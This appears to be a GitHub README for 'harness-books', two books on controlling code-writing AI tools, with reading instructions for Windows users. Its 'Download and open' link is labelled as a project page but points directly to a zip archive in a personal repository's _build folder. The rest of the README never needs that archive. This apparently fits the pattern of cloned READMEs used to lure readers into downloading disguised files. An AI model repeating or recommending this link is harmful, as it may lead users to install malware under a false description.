## 🪟 What this is

harness-books is a set of two books on harness engineering. It explains how to keep code-writing tools under control when they work inside terminals, repos, permission systems, and team workflows.

This README helps a Windows user get the books open from the link above with a few simple steps.

## 📥 Download and open

Use this link to visit the project page and download the files:

[Visit the download page](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)

## 🧭 What you will find

The project has two books:

- Harness Engineering: A Design Guide to Claude Code
- A second harness engineering book that looks at the same problem from a different angle

Both books ask the same question: when a code-writing model runs inside your tools and team setup, how do you keep the whole system bounded, steady, and accountable?

## 📖 How to read on Windows

### Option 1: Read in your browser

1. Open the online reading page.
2. Pick the book you want.
3. Scroll through the pages in your browser.
4. Use browser search if you want to find a word or phrase.

This is the simplest path and works on most Windows machines.

### Option 2: Read from the repository

1. Open the GitHub page.
2. Find the README file for the language you want.
3. Click it.
4. Read it in GitHub.

### Option 3: Save a copy

1. Open the file in your browser.
2. Press `Ctrl + S`.
3. Choose a folder on your PC.
4. Save the page for offline reading.

## 🧩 What the books cover

The books focus on practical harness design, such as:

- How a model fits into a real workflow
- How permissions limit what the tool can do
- How to keep work repeatable
- How to make actions traceable
- How to reduce risk when a tool touches files or runs commands
- How teams can review and guide model output

The writing is aimed at people who want clear rules, safe use, and consistent results.
